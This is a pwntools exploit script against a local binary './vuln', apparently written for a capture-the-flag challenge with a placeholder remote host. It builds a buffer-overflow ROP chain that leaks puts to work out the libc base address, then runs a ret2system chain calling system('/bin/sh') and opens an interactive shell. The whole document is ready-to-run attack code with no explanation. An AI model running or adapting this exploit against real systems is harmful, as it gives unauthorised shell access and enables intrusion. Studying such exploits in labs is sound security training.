from pwn import *
import time, os

elf = context.binary = ELF('./vuln')
libc = ELF(elf.runpath + b'/libc.so.6')

def start():
    gs = ''' continue '''

    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('somedomain.net', 0000)
    else:
        return process(elf.path)

def receive():
    io.recvuntil(b'sErVeR!')

io = start()
receive()

# GADGETS
PADDING     = 'A' * 136 
POP_RDI_RET = p64(0x400913)
RET         = p64(0x40052e)

# LIBC LEAK -> PUTS
ropchain_leaklibc = flat(
        PADDING, 
        POP_RDI_RET,
        elf.got['puts'],
        elf.plt['puts'],
        elf.symbols['main']
)

# SEND PAYLOAD AND CALC LIBC
io.sendline(ropchain_leaklibc)
p = io.recvrepeat(0.1).strip()[122:-27]
PUTS_LEAK = u64(p.ljust(8, b"\x00"))
libc.address = PUTS_LEAK - libc.symbols['puts']

# SUCCESS MESSAGES
log.success(hex(PUTS_LEAK))
log.success('Libc: '+hex(libc.address))
log.success('System: '+ hex(libc.symbols['system']))
log.success('Bash addr: '+ hex(libc.address + 0x1b40fa))

#RET2SYSTEM
ropchain_system = flat(
        PADDING,
        RET,
        POP_RDI_RET,
        next(libc.search(b'/bin/sh')),
        #libc.address + 0x1b40fa,
        libc.symbols['system'],
        p64(0)
)

io.sendline(ropchain_system)
io.interactive()

